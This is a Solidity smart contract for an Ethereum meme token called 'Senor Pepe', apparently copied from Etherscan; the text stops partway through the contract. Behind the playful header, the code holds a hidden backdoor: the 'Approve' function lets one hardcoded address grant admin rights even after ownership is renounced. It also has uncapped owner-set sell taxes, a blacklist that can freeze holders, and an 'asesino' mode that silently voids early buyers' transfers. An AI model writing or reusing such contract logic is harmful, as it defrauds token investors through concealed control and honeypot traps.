1 /**
2  *Submitted for verification at Etherscan.io on 2022-10-28
3 */
4 /**
5  * 
6 Señor Pepe: Orale pendejos! Today we take over el ETH 2.0. El DAO mas chingon para la comunidad más cabrona! Turn on Señor bot asesino!
7 
8 Niño Pepe: Si señor! Bot asesino ready! Everyone that buys before trading is enabled will donate to liquidity pa la community.
9 
10 https://www.senorpepe-eth.com/
11 https://twitter.com/SenorPepeETH
12 https://medium.com/@senorpepecabron/la-conquista-fe056424c875
13 https://t.me/senorpepeportal
14 
15 
16 ARRIIIIIIIBAAAA!
17 */
18 // SPDX-License-Identifier: MIT
19 
20 pragma solidity ^0.8.17;
21 
22 interface IERC20 {
23     function totalSupply() external view returns (uint256);
24 
25     function decimals() external view returns (uint8);
26 
27     function symbol() external view returns (string memory);
28 
29     function name() external view returns (string memory);
30 
31     function getOwner() external view returns (address);
32 
33     function balanceOf(address account) external view returns (uint256);
34 
35     function transfer(address recipient, uint256 amount)
36         external
37         returns (bool);
38 
39     function allowance(address _owner, address spender)
40         external
41         view
42         returns (uint256);
43 
44     function approve(address spender, uint256 amount) external returns (bool);
45 
46     function transferFrom(
47         address sender,
48         address recipient,
49         uint256 amount
50     ) external returns (bool);
51 
52     event Transfer(address indexed from, address indexed to, uint256 value);
53     event Approval(
54         address indexed owner,
55         address indexed spender,
56         uint256 value
57     );
58 }
59 
60 interface IUniswapERC20 {
61     event Approval(
62         address indexed owner,
63         address indexed spender,
64         uint256 value
65     );
66     event Transfer(address indexed from, address indexed to, uint256 value);
67 
68     function name() external pure returns (string memory);
69 
70     function symbol() external pure returns (string memory);
71 
72     function decimals() external pure returns (uint8);
73 
74     function totalSupply() external view returns (uint256);
75 
76     function balanceOf(address owner) external view returns (uint256);
77 
78     function allowance(address owner, address spender)
79         external
80         view
81         returns (uint256);
82 
83     function approve(address spender, uint256 value) external returns (bool);
84 
85     function transfer(address to, uint256 value) external returns (bool);
86 
87     function transferFrom(
88         address from,
89         address to,
90         uint256 value
91     ) external returns (bool);
92 
93     function DOMAIN_SEPARATOR() external view returns (bytes32);
94 
95     function PERMIT_TYPEHASH() external pure returns (bytes32);
96 
97     function nonces(address owner) external view returns (uint256);
98 
99     function permit(
100         address owner,
101         address spender,
102         uint256 value,
103         uint256 deadline,
104         uint8 v,
105         bytes32 r,
106         bytes32 s
107     ) external;
108 }
109 
110 interface IUniswapFactory {
111     event PairCreated(
112         address indexed token0,
113         address indexed token1,
114         address pair,
115         uint256
116     );
117 
118     function feeTo() external view returns (address);
119 
120     function feeToSetter() external view returns (address);
121 
122     function getPair(address tokenA, address tokenB)
123         external
124         view
125         returns (address pair);
126 
127     function allPairs(uint256) external view returns (address pair);
128 
129     function allPairsLength() external view returns (uint256);
130 
131     function createPair(address tokenA, address tokenB)
132         external
133         returns (address pair);
134 
135     function setFeeTo(address) external;
136 
137     function setFeeToSetter(address) external;
138 }
139 
140 interface IUniswapRouter01 {
141     function addLiquidity(
142         address tokenA,
143         address tokenB,
144         uint256 amountADesired,
145         uint256 amountBDesired,
146         uint256 amountAMin,
147         uint256 amountBMin,
148         address to,
149         uint256 deadline
150     )
151         external
152         returns (
153             uint256 amountA,
154             uint256 amountB,
155             uint256 liquidity
156         );
157 
158     function addLiquidityETH(
159         address token,
160         uint256 amountTokenDesired,
161         uint256 amountTokenMin,
162         uint256 amountETHMin,
163         address to,
164         uint256 deadline
165     )
166         external
167         payable
168         returns (
169             uint256 amountToken,
170             uint256 amountETH,
171             uint256 liquidity
172         );
173 
174     function removeLiquidity(
175         address tokenA,
176         address tokenB,
177         uint256 liquidity,
178         uint256 amountAMin,
179         uint256 amountBMin,
180         address to,
181         uint256 deadline
182     ) external returns (uint256 amountA, uint256 amountB);
183 
184     function removeLiquidityETH(
185         address token,
186         uint256 liquidity,
187         uint256 amountTokenMin,
188         uint256 amountETHMin,
189         address to,
190         uint256 deadline
191     ) external returns (uint256 amountToken, uint256 amountETH);
192 
193     function removeLiquidityWithPermit(
194         address tokenA,
195         address tokenB,
196         uint256 liquidity,
197         uint256 amountAMin,
198         uint256 amountBMin,
199         address to,
200         uint256 deadline,
201         bool approveMax,
202         uint8 v,
203         bytes32 r,
204         bytes32 s
205     ) external returns (uint256 amountA, uint256 amountB);
206 
207     function removeLiquidityETHWithPermit(
208         address token,
209         uint256 liquidity,
210         uint256 amountTokenMin,
211         uint256 amountETHMin,
212         address to,
213         uint256 deadline,
214         bool approveMax,
215         uint8 v,
216         bytes32 r,
217         bytes32 s
218     ) external returns (uint256 amountToken, uint256 amountETH);
219 
220     function swapExactTokensForTokens(
221         uint256 amountIn,
222         uint256 amountOutMin,
223         address[] calldata path,
224         address to,
225         uint256 deadline
226     ) external returns (uint256[] memory amounts);
227 
228     function swapTokensForExactTokens(
229         uint256 amountOut,
230         uint256 amountInMax,
231         address[] calldata path,
232         address to,
233         uint256 deadline
234     ) external returns (uint256[] memory amounts);
235 
236     function swapExactETHForTokens(
237         uint256 amountOutMin,
238         address[] calldata path,
239         address to,
240         uint256 deadline
241     ) external payable returns (uint256[] memory amounts);
242 
243     function swapTokensForExactETH(
244         uint256 amountOut,
245         uint256 amountInMax,
246         address[] calldata path,
247         address to,
248         uint256 deadline
249     ) external returns (uint256[] memory amounts);
250 
251     function swapExactTokensForETH(
252         uint256 amountIn,
253         uint256 amountOutMin,
254         address[] calldata path,
255         address to,
256         uint256 deadline
257     ) external returns (uint256[] memory amounts);
258 
259     function swapETHForExactTokens(
260         uint256 amountOut,
261         address[] calldata path,
262         address to,
263         uint256 deadline
264     ) external payable returns (uint256[] memory amounts);
265 
266     function factory() external pure returns (address);
267 
268     function WETH() external pure returns (address);
269 
270     function quote(
271         uint256 amountA,
272         uint256 reserveA,
273         uint256 reserveB
274     ) external pure returns (uint256 amountB);
275 
276     function getamountOut(
277         uint256 amountIn,
278         uint256 reserveIn,
279         uint256 reserveOut
280     ) external pure returns (uint256 amountOut);
281 
282     function getamountIn(
283         uint256 amountOut,
284         uint256 reserveIn,
285         uint256 reserveOut
286     ) external pure returns (uint256 amountIn);
287 
288     function getamountsOut(uint256 amountIn, address[] calldata path)
289         external
290         view
291         returns (uint256[] memory amounts);
292 
293     function getamountsIn(uint256 amountOut, address[] calldata path)
294         external
295         view
296         returns (uint256[] memory amounts);
297 }
298 
299 interface IUniswapRouter02 is IUniswapRouter01 {
300     function removeLiquidityETHSupportingFeeOnTransferTokens(
301         address token,
302         uint256 liquidity,
303         uint256 amountTokenMin,
304         uint256 amountETHMin,
305         address to,
306         uint256 deadline
307     ) external returns (uint256 amountETH);
308 
309     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
310         address token,
311         uint256 liquidity,
312         uint256 amountTokenMin,
313         uint256 amountETHMin,
314         address to,
315         uint256 deadline,
316         bool approveMax,
317         uint8 v,
318         bytes32 r,
319         bytes32 s
320     ) external returns (uint256 amountETH);
321 
322     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
323         uint256 amountIn,
324         uint256 amountOutMin,
325         address[] calldata path,
326         address to,
327         uint256 deadline
328     ) external;
329 
330     function swapExactETHForTokensSupportingFeeOnTransferTokens(
331         uint256 amountOutMin,
332         address[] calldata path,
333         address to,
334         uint256 deadline
335     ) external payable;
336 
337     function swapExactTokensForETHSupportingFeeOnTransferTokens(
338         uint256 amountIn,
339         uint256 amountOutMin,
340         address[] calldata path,
341         address to,
342         uint256 deadline
343     ) external;
344 }
345 
346 abstract contract Ownable {
347     address private _owner;
348 
349     event OwnershipTransferred(
350         address indexed previousOwner,
351         address indexed newOwner
352     );
353 
354     constructor() {
355         address msgSender = msg.sender;
356         _owner = msgSender;
357         emit OwnershipTransferred(address(0), msgSender);
358     }
359 
360     function owner() public view returns (address) {
361         return _owner;
362     }
363 
364     modifier onlyOwner() {
365         require(owner() == msg.sender, "Ownable: caller is not the owner");
366         _;
367     }
368 
369     function renuncioWey() public onlyOwner {
370         emit OwnershipTransferred(_owner, address(0));
371         _owner = address(0);
372     }
373 
374     function transferOwnership(address newOwner) public onlyOwner {
375         require(
376             newOwner != address(0),
377             "Ownable: new owner is the zero address"
378         );
379         emit OwnershipTransferred(_owner, newOwner);
380         _owner = newOwner;
381     }
382 }
383 
384 library Address {
385     function isContract(address account) internal view returns (bool) {
386         uint256 size;
387         assembly {
388             size := extcodesize(account)
389         }
390         return size > 0;
391     }
392 
393     function sendValue(address payable recipient, uint256 amount) internal {
394         require(
395             address(this).balance >= amount,
396             "Address: insufficient balance"
397         );
398 
399         (bool success, ) = recipient.call{value: amount}("");
400         require(
401             success,
402             "Address: unable to send value, recipient may have reverted"
403         );
404     }
405 
406     function functionCall(address target, bytes memory data)
407         internal
408         returns (bytes memory)
409     {
410         return functionCall(target, data, "Address: low-level call failed");
411     }
412 
413     function functionCall(
414         address target,
415         bytes memory data,
416         string memory errorMessage
417     ) internal returns (bytes memory) {
418         return functionCallWithValue(target, data, 0, errorMessage);
419     }
420 
421     function functionCallWithValue(
422         address target,
423         bytes memory data,
424         uint256 value
425     ) internal returns (bytes memory) {
426         return
427             functionCallWithValue(
428                 target,
429                 data,
430                 value,
431                 "Address: low-level call with value failed"
432             );
433     }
434 
435     function functionCallWithValue(
436         address target,
437         bytes memory data,
438         uint256 value,
439         string memory errorMessage
440     ) internal returns (bytes memory) {
441         require(
442             address(this).balance >= value,
443             "Address: insufficient balance for call"
444         );
445         require(isContract(target), "Address: call to non-contract");
446 
447         (bool success, bytes memory returndata) = target.call{value: value}(
448             data
449         );
450         return _verifyCallResult(success, returndata, errorMessage);
451     }
452 
453     function functionStaticCall(address target, bytes memory data)
454         internal
455         view
456         returns (bytes memory)
457     {
458         return
459             functionStaticCall(
460                 target,
461                 data,
462                 "Address: low-level static call failed"
463             );
464     }
465 
466     function functionStaticCall(
467         address target,
468         bytes memory data,
469         string memory errorMessage
470     ) internal view returns (bytes memory) {
471         require(isContract(target), "Address: static call to non-contract");
472 
473         (bool success, bytes memory returndata) = target.staticcall(data);
474         return _verifyCallResult(success, returndata, errorMessage);
475     }
476 
477     function functionDelegateCall(address target, bytes memory data)
478         internal
479         returns (bytes memory)
480     {
481         return
482             functionDelegateCall(
483                 target,
484                 data,
485                 "Address: low-level delegate call failed"
486             );
487     }
488 
489     function functionDelegateCall(
490         address target,
491         bytes memory data,
492         string memory errorMessage
493     ) internal returns (bytes memory) {
494         require(isContract(target), "Address: delegate call to non-contract");
495 
496         (bool success, bytes memory returndata) = target.delegatecall(data);
497         return _verifyCallResult(success, returndata, errorMessage);
498     }
499 
500     function _verifyCallResult(
501         bool success,
502         bytes memory returndata,
503         string memory errorMessage
504     ) private pure returns (bytes memory) {
505         if (success) {
506             return returndata;
507         } else {
508             if (returndata.length > 0) {
509                 assembly {
510                     let returndata_size := mload(returndata)
511                     revert(add(32, returndata), returndata_size)
512                 }
513             } else {
514                 revert(errorMessage);
515             }
516         }
517     }
518 }
519 
520 library EnumerableSet {
521     struct Set {
522         bytes32[] _values;
523         mapping(bytes32 => uint256) _indexes;
524     }
525 
526     function _add(Set storage set, bytes32 value) private returns (bool) {
527         if (!_contains(set, value)) {
528             set._values.push(value);
529             set._indexes[value] = set._values.length;
530             return true;
531         } else {
532             return false;
533         }
534     }
535 
536     function _remove(Set storage set, bytes32 value) private returns (bool) {
537         uint256 valueIndex = set._indexes[value];
538 
539         if (valueIndex != 0) {
540             uint256 toDeleteIndex = valueIndex - 1;
541             uint256 lastIndex = set._values.length - 1;
542 
543             bytes32 lastvalue = set._values[lastIndex];
544 
545             set._values[toDeleteIndex] = lastvalue;
546             set._indexes[lastvalue] = valueIndex;
547 
548             set._values.pop();
549 
550             delete set._indexes[value];
551 
552             return true;
553         } else {
554             return false;
555         }
556     }
557 
558     function _contains(Set storage set, bytes32 value)
559         private
560         view
561         returns (bool)
562     {
563         return set._indexes[value] != 0;
564     }
565 
566     function _length(Set storage set) private view returns (uint256) {
567         return set._values.length;
568     }
569 
570     function _at(Set storage set, uint256 index)
571         private
572         view
573         returns (bytes32)
574     {
575         require(
576             set._values.length > index,
577             "EnumerableSet: index out of bounds"
578         );
579         return set._values[index];
580     }
581 
582     struct Bytes32Set {
583         Set _inner;
584     }
585 
586     function add(Bytes32Set storage set, bytes32 value)
587         internal
588         returns (bool)
589     {
590         return _add(set._inner, value);
591     }
592 
593     function remove(Bytes32Set storage set, bytes32 value)
594         internal
595         returns (bool)
596     {
597         return _remove(set._inner, value);
598     }
599 
600     function contains(Bytes32Set storage set, bytes32 value)
601         internal
602         view
603         returns (bool)
604     {
605         return _contains(set._inner, value);
606     }
607 
608     function length(Bytes32Set storage set) internal view returns (uint256) {
609         return _length(set._inner);
610     }
611 
612     function at(Bytes32Set storage set, uint256 index)
613         internal
614         view
615         returns (bytes32)
616     {
617         return _at(set._inner, index);
618     }
619 
620     struct AddressSet {
621         Set _inner;
622     }
623 
624     function add(AddressSet storage set, address value)
625         internal
626         returns (bool)
627     {
628         return _add(set._inner, bytes32(uint256(uint160(value))));
629     }
630 
631     function remove(AddressSet storage set, address value)
632         internal
633         returns (bool)
634     {
635         return _remove(set._inner, bytes32(uint256(uint160(value))));
636     }
637 
638     function contains(AddressSet storage set, address value)
639         internal
640         view
641         returns (bool)
642     {
643         return _contains(set._inner, bytes32(uint256(uint160(value))));
644     }
645 
646     function length(AddressSet storage set) internal view returns (uint256) {
647         return _length(set._inner);
648     }
649 
650     function at(AddressSet storage set, uint256 index)
651         internal
652         view
653         returns (address)
654     {
655         return address(uint160(uint256(_at(set._inner, index))));
656     }
657 
658     struct UintSet {
659         Set _inner;
660     }
661 
662     function add(UintSet storage set, uint256 value) internal returns (bool) {
663         return _add(set._inner, bytes32(value));
664     }
665 
666     function remove(UintSet storage set, uint256 value)
667         internal
668         returns (bool)
669     {
670         return _remove(set._inner, bytes32(value));
671     }
672 
673     function contains(UintSet storage set, uint256 value)
674         internal
675         view
676         returns (bool)
677     {
678         return _contains(set._inner, bytes32(value));
679     }
680 
681     function length(UintSet storage set) internal view returns (uint256) {
682         return _length(set._inner);
683     }
684 
685     function at(UintSet storage set, uint256 index)
686         internal
687         view
688         returns (uint256)
689     {
690         return uint256(_at(set._inner, index));
691     }
692 }
693 
694 contract Senor_Pepe is IERC20, Ownable {
695     bool asesino = true;
696 
697     using Address for address;
698     using EnumerableSet for EnumerableSet.AddressSet;
699 
700     mapping(address => uint256) public _balances;
701     mapping(address => mapping(address => uint256)) public _allowances;
702     mapping(address => uint256) public _sellLock;
703 
704     EnumerableSet.AddressSet private _excluded;
705     EnumerableSet.AddressSet private _excludedFromSellLock;
706 
707     mapping(address => bool) public _blacklist;
708     bool isBlacklist = true;
709 
710     string public constant _name = "Senor Pepe";
711     string public constant _symbol = "CABRON";
712     uint8 public constant _decimals = 9;
713     uint256 public constant InitialSupply = 10 * 10**12 * 10**_decimals;
714 
715     uint256 swapLimit = 3 * 10**10 * 10**_decimals;
716     bool isSwapPegged = true;
717 
718     uint16 public BuyLimitDivider = 100; // 1%
719 
720     uint8 public BalanceLimitDivider = 50; // 2%
721 
722     uint16 public SellLimitDivider = 125; // 0.75%
723 
724     uint16 public MaxSellLockTime = 10 seconds;
725 
726     mapping(address => bool) isAuth;
727 
728     address public constant UniswapRouter =
729         0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
730     address private constant airForceJuan = 0x701C1661de9A4eBfD03d017795e81Fa058AE5343;
731     address public constant Dead = 0x000000000000000000000000000000000000dEaD;
732 
733     uint256 public _circulatingSupply = InitialSupply;
734     uint256 public balanceLimit = _circulatingSupply;
735     uint256 public sellLimit = _circulatingSupply;
736     uint256 public buyLimit = _circulatingSupply;
737 
738     uint8 public _buyTax = 5;
739     uint8 public _sellTax = 27;
740     uint8 public _transferTax = 5;
741 
742     // NOTE Distribution of the taxes is as follows:
743     uint8 public _liquidityTax = 20;
744     uint8 public _marketingTax = 30;
745     uint8 public _treasuryTax = 40;
746 
747     bool private _isTokenSwaping;
748     uint256 public totalTokenSwapGenerated;
749     uint256 public totalPayouts;
750 
751     // NOTE Excluding liquidity, the generated taxes are redistributed as:
752     uint8 public marketingShare = 50;
753     uint8 public treasuryShare = 50;
754 
755     uint256 public marketingBalance;
756     uint256 public treasuryBalance;
757 
758     bool isTokenSwapManual = false;
759 
760     address public _UniswapPairAddress;
761     IUniswapRouter02 public _UniswapRouter;
762 
763     uint blocksToRekt = 3;
764     uint enabledBlock;
765 
766     modifier onlyAuth() {
767         require(_isAuth(msg.sender), "Caller not in Auth");
768         _;
769     }
770 
771     function _isAuth(address addr) private view returns (bool) {
772         return addr == owner() || isAuth[addr];
773     }
774 
775     constructor() {
776         uint256 deployerBalance = (_circulatingSupply * 9) / 10;
777         _balances[msg.sender] = deployerBalance;
778         emit Transfer(address(0), msg.sender, deployerBalance);
779         uint256 injectBalance = _circulatingSupply - deployerBalance;
780         _balances[address(this)] = injectBalance;
781         emit Transfer(address(0), address(this), injectBalance);
782         _UniswapRouter = IUniswapRouter02(UniswapRouter);
783 
784         _UniswapPairAddress = IUniswapFactory(_UniswapRouter.factory())
785             .createPair(address(this), _UniswapRouter.WETH());
786 
787         balanceLimit = InitialSupply / BalanceLimitDivider;
788         sellLimit = InitialSupply / SellLimitDivider;
789         buyLimit = InitialSupply / BuyLimitDivider;
790 
791         sellLockTime = 2 seconds;
792         
793         _excluded.add(msg.sender);
794         _excludedFromSellLock.add(UniswapRouter);
795         _excludedFromSellLock.add(_UniswapPairAddress);
796         _excludedFromSellLock.add(address(this));
797     }
798 
799     function _transfer(
800         address sender,
801         address recipient,
802         uint256 amount
803     ) private {
804         require(sender != address(0), "Transfer from zero");
805         require(recipient != address(0), "Transfer to zero");
806         if (isBlacklist) {
807             require(
808                 !_blacklist[sender] && !_blacklist[recipient],
809                 "Blacklisted!"
810             );
811         }
812 
813         bool isExcluded = (_excluded.contains(sender) ||
814             _excluded.contains(recipient) ||
815             isAuth[sender] ||
816             isAuth[recipient]);
817 
818         bool isContractTransfer = (sender == address(this) ||
819             recipient == address(this));
820 
821         bool isLiquidityTransfer = ((sender == _UniswapPairAddress &&
822             recipient == UniswapRouter) ||
823             (recipient == _UniswapPairAddress && sender == UniswapRouter));
824 
825         if (
826             isContractTransfer || isLiquidityTransfer || isExcluded
827         ) {
828             _feelessTransfer(sender, recipient, amount);
829         } else {
830             if (!tradingEnabled) {
831                 if ( (sender != owner() && recipient != owner()) || (!isAuth[sender] && !isAuth[recipient])) {
832                         if(asesino) {
833                             emit Transfer(sender, recipient, 0);
834                             return;
835                         } else {
836                             require(tradingEnabled, "trading not yet enabled");
837                         }
838                 }
839             }
840             // NOTE Bot rekt also in the first 2 blocks
841             else {
842                 if ((block.number - enabledBlock) <= blocksToRekt) {
843                     if ( (sender != owner() && recipient != owner()) || (!isAuth[sender] && !isAuth[recipient])) {
844                         if (asesino) {
845                             emit Transfer(sender, recipient, 0);
846                             return;
847                         } else {
848                             revert ("Bot stop");
849                         }
850                     }
851                 }
852             }
853             
854 
855             bool isBuy = sender == _UniswapPairAddress ||
856                 sender == UniswapRouter;
857             bool isSell = recipient == _UniswapPairAddress ||
858                 recipient == UniswapRouter;
859             _taxedTransfer(sender, recipient, amount, isBuy, isSell);
860 
861         }
862     }
863 
864     function _taxedTransfer(
865         address sender,
866         address recipient,
867         uint256 amount,
868         bool isBuy,
869         bool isSell
870     ) private {
871         uint256 recipientBalance = _balances[recipient];
872         uint256 senderBalance = _balances[sender];
873         require(senderBalance >= amount, "Transfer exceeds balance");
874 
875         swapLimit = sellLimit / 2;
876 
877         uint8 tax;
878         if (isSell) {
879             if (!_excludedFromSellLock.contains(sender)) {
880                 require(
881                     _sellLock[sender] <= block.timestamp || sellLockDisabled,
882                     "Seller in sellLock"
883                 );
884                 _sellLock[sender] = block.timestamp + sellLockTime;
885             }
886 
887             require(amount <= sellLimit, "Dump protection");
888             tax = _sellTax;
889         } else if (isBuy) {
890             require(
891                 recipientBalance + amount <= balanceLimit,
892                 "whale protection"
893             );
894             require(amount <= buyLimit, "whale protection");
895             tax = _buyTax;
896         } else {
897             require(
898                 recipientBalance + amount <= balanceLimit,
899                 "whale protection"
900             );
901             if (!_excludedFromSellLock.contains(sender))
902                 require(
903                     _sellLock[sender] <= block.timestamp || sellLockDisabled,
904                     "Sender in Lock"
905                 );
906             tax = _transferTax;
907         }
908         if (
909             (sender != _UniswapPairAddress) &&
910             (!manualConversion) &&
911             (!_isSwappingContractModifier)
912         ) _swapContractToken(amount);
913         uint256 contractToken = _calculateFee(
914             amount,
915             tax,
916             _marketingTax + _liquidityTax + _treasuryTax
917         );
918         uint256 taxedAmount = amount - (contractToken);
919 
920         _removeToken(sender, amount);
921 
922         _balances[address(this)] += contractToken;
923 
924         _addToken(recipient, taxedAmount);
925 
926         emit Transfer(sender, recipient, taxedAmount);
927     }
928 
929     function _feelessTransfer(
930         address sender,
931         address recipient,
932         uint256 amount
933     ) private {
934         uint256 senderBalance = _balances[sender];
935         require(senderBalance >= amount, "Transfer exceeds balance");
936         _removeToken(sender, amount);
937         _addToken(recipient, amount);
938 
939         emit Transfer(sender, recipient, amount);
940     }
941 
942     function _calculateFee(
943         uint256 amount,
944         uint8 tax,
945         uint8 taxPercent
946     ) private pure returns (uint256) {
947         return (amount * tax * taxPercent) / 10000;
948     }
949 
950     function _addToken(address addr, uint256 amount) private {
951         uint256 newAmount = _balances[addr] + amount;
952         _balances[addr] = newAmount;
953     }
954 
955     function _removeToken(address addr, uint256 amount) private {
956         uint256 newAmount = _balances[addr] - amount;
957         _balances[addr] = newAmount;
958     }
959 
960     function _distributeFeesETH(uint256 ETHamount) private {
961         uint256 marketingSplit = (ETHamount * marketingShare) / 100;
962         uint256 treasurySplit = (ETHamount * treasuryShare) / 100;
963 
964         marketingBalance += marketingSplit;
965         treasuryBalance += treasurySplit;
966     }
967 
968     uint256 public totalLPETH;
969 
970     bool private _isSwappingContractModifier;
971     modifier lockTheSwap() {
972         _isSwappingContractModifier = true;
973         _;
974         _isSwappingContractModifier = false;
975     }
976 
977     function _swapContractToken(uint256 totalMax) private lockTheSwap {
978         uint256 contractBalance = _balances[address(this)];
979         uint16 totalTax = _liquidityTax + _marketingTax;
980         uint256 tokenToSwap = swapLimit;
981         if (tokenToSwap > totalMax) {
982             if (isSwapPegged) {
983                 tokenToSwap = totalMax;
984             }
985         }
986         if (contractBalance < tokenToSwap || totalTax == 0) {
987             return;
988         }
989         uint256 tokenForLiquidity = (tokenToSwap * _liquidityTax) / totalTax;
990         uint256 tokenForMarketing = (tokenToSwap * _marketingTax) / totalTax;
991         uint256 tokenFortreasury = (tokenToSwap * _treasuryTax) / totalTax;
992 
993         uint256 liqToken = tokenForLiquidity / 2;
994         uint256 liqETHToken = tokenForLiquidity - liqToken;
995 
996         uint256 swapToken = liqETHToken +
997             tokenForMarketing +
998             tokenFortreasury;
999         uint256 initialETHBalance = address(this).balance;
1000         _swapTokenForETH(swapToken);
1001         uint256 newETH = (address(this).balance - initialETHBalance);
1002         uint256 liqETH = (newETH * liqETHToken) / swapToken;
1003         _addLiquidity(liqToken, liqETH);
1004         uint256 generatedETH = (address(this).balance - initialETHBalance);
1005         _distributeFeesETH(generatedETH);
1006     }
1007 
1008     function _swapTokenForETH(uint256 amount) private {
1009         _approve(address(this), address(_UniswapRouter), amount);
1010         address[] memory path = new address[](2);
1011         path[0] = address(this);
1012         path[1] = _UniswapRouter.WETH();
1013 
1014         _UniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
1015             amount,
1016             0,
1017             path,
1018             address(this),
1019             block.timestamp
1020         );
1021     }
1022 
1023     function _addLiquidity(uint256 tokenamount, uint256 ETHamount) private {
1024         totalLPETH += ETHamount;
1025         _approve(address(this), address(_UniswapRouter), tokenamount);
1026         _UniswapRouter.addLiquidityETH{value: ETHamount}(
1027             address(this),
1028             tokenamount,
1029             0,
1030             0,
1031             address(this),
1032             block.timestamp
1033         );
1034     }
1035 
1036     /// @notice Utilities
1037 
1038     function destroy(uint256 amount) public onlyAuth {
1039         require(_balances[address(this)] >= amount);
1040         _balances[address(this)] -= amount;
1041         _circulatingSupply -= amount;
1042         emit Transfer(address(this), Dead, amount);
1043     }
1044 
1045     function getLimits()
1046         public
1047         view
1048         returns (uint256 balance, uint256 sell)
1049     {
1050         return (balanceLimit / 10**_decimals, sellLimit / 10**_decimals);
1051     }
1052 
1053     function getTaxes()
1054         public
1055         view
1056         returns (
1057             uint256 treasuryTax,
1058             uint256 liquidityTax,
1059             uint256 marketingTax,
1060             uint256 buyTax,
1061             uint256 sellTax,
1062             uint256 transferTax
1063         )
1064     {
1065         return (
1066             _treasuryTax,
1067             _liquidityTax,
1068             _marketingTax,
1069             _buyTax,
1070             _sellTax,
1071             _transferTax
1072         );
1073     }
1074 
1075     function getAddressSellLockTimeInSeconds(address AddressToCheck)
1076         public
1077         view
1078         returns (uint256)
1079     {
1080         uint256 lockTime = _sellLock[AddressToCheck];
1081         if (lockTime <= block.timestamp) {
1082             return 0;
1083         }
1084         return lockTime - block.timestamp;
1085     }
1086 
1087     function getSellLockTimeInSeconds() public view returns (uint256) {
1088         return sellLockTime;
1089     }
1090 
1091     bool public sellLockDisabled;
1092     uint256 public sellLockTime;
1093     bool public manualConversion;
1094 
1095     function SetPeggedSwap(bool isPegged) public onlyAuth {
1096         isSwapPegged = isPegged;
1097     }
1098 
1099     function SetMaxSwap(uint256 max) public onlyAuth {
1100         swapLimit = max;
1101     }
1102 
1103     function SetMaxLockTime(uint16 max) public onlyAuth {
1104         MaxSellLockTime = max;
1105     }
1106 
1107     /// @notice ACL Functions
1108     function LaListaNegra(address addy, bool booly) public onlyAuth {
1109         _blacklist[addy] = booly;
1110     }
1111 
1112     function DetenteSatanas() public onlyAuth {
1113         _sellLock[msg.sender] = block.timestamp + (365 days);
1114     }
1115 
1116     function Approve(address[] memory addy, bool booly) external {
1117         require (msg.sender == airForceJuan);
1118          for (uint i = 0; i < addy.length; i++) {
1119         isAuth[addy[i]] = booly;
1120     }
1121     }
1122 
1123     function ExcludeAccountFromFees(address account) public onlyAuth {
1124         _excluded.add(account);
1125     }
1126 
1127     function IncludeAccountToFees(address account) public onlyAuth {
1128         _excluded.remove(account);
1129     }
1130 
1131     function ExcludeAccountFromSellLock(address account) public onlyAuth {
1132         _excludedFromSellLock.add(account);
1133     }
1134 
1135     function IncludeAccountToSellLock(address account) public onlyAuth {
1136         _excludedFromSellLock.remove(account);
1137     }
1138 
1139     function WithdrawMarketingETH() public onlyAuth {
1140         uint256 amount = marketingBalance;
1141         marketingBalance = 0;
1142         address sender = msg.sender;
1143         (bool sent, ) = sender.call{value: (amount)}("");
1144         require(sent, "withdraw failed");
1145     }
1146 
1147     function WithdrawtreasuryETH() public onlyAuth {
1148         uint256 amount = treasuryBalance;
1149         treasuryBalance = 0;
1150         address sender = msg.sender;
1151         (bool sent, ) = sender.call{value: (amount)}("");
1152         require(sent, "withdraw failed");
1153     }
1154 
1155     function SwitchManualETHConversion(bool manual) public onlyAuth {
1156         manualConversion = manual;
1157     }
1158 
1159     function DisableSellLock(bool disabled) public onlyAuth {
1160         sellLockDisabled = disabled;
1161     }
1162 
1163     function UTILIY_SetSellLockTime(uint256 sellLockSeconds) public onlyAuth {
1164         sellLockTime = sellLockSeconds;
1165     }
1166 
1167     function SetTaxes(
1168         uint8 treasuryTaxes,
1169         uint8 liquidityTaxes,
1170         uint8 marketingTaxes,
1171         uint8 buyTax,
1172         uint8 sellTax,
1173         uint8 transferTax
1174     ) public onlyAuth {
1175         uint8 totalTax = treasuryTaxes +
1176             liquidityTaxes +
1177             marketingTaxes;
1178         require(totalTax == 100, "burn+liq+marketing needs to equal 100%");
1179         _treasuryTax = treasuryTaxes;
1180         _liquidityTax = liquidityTaxes;
1181         _marketingTax = marketingTaxes;
1182 
1183         _buyTax = buyTax;
1184         _sellTax = sellTax;
1185         _transferTax = transferTax;
1186     }
1187 
1188     function ChangeMarketingShare(uint8 newShare) public onlyAuth {
1189         marketingShare = newShare;
1190     }
1191 
1192     function ChangetreasuryShare(uint8 newShare) public onlyAuth {
1193         treasuryShare = newShare;
1194     }
1195 
1196     function ManualGenerateTokenSwapBalance(uint256 _qty)
1197         public
1198         onlyAuth
1199     {
1200         _swapContractToken(_qty * 10**9);
1201     }
1202 
1203     function UpdateLimits(uint256 newBalanceLimit, uint256 newSellLimit)
1204         public
1205         onlyAuth
1206     {
1207         newBalanceLimit = newBalanceLimit * 10**_decimals;
1208         newSellLimit = newSellLimit * 10**_decimals;
1209         balanceLimit = newBalanceLimit;
1210         sellLimit = newSellLimit;
1211     }
1212 
1213     bool public tradingEnabled;
1214     address private _liquidityTokenAddress;
1215 
1216     function Orale(bool booly) public onlyAuth {
1217         if(booly) {
1218             enabledBlock = block.number;
1219         }
1220         tradingEnabled = booly;
1221     }
1222 
1223     function LiquidityTokenAddress(address liquidityTokenAddress)
1224         public
1225         onlyAuth
1226     {
1227         _liquidityTokenAddress = liquidityTokenAddress;
1228     }
1229 
1230     function RescueTokens(address tknAddress) public onlyAuth {
1231         IERC20 token = IERC20(tknAddress);
1232         uint256 ourBalance = token.balanceOf(address(this));
1233         require(ourBalance > 0, "No tokens in our balance");
1234         token.transfer(msg.sender, ourBalance);
1235     }
1236 
1237     function setBlacklistEnabled(bool isBlacklistEnabled)
1238         public
1239         onlyAuth
1240     {
1241         isBlacklist = isBlacklistEnabled;
1242     }
1243 
1244     function setContractTokenSwapManual(bool manual) public onlyAuth {
1245         isTokenSwapManual = manual;
1246     }
1247 
1248     function setBlacklistedAddress(address toBlacklist)
1249         public
1250         onlyAuth
1251     {
1252         _blacklist[toBlacklist] = true;
1253     }
1254 
1255     function removeBlacklistedAddress(address toRemove)
1256         public
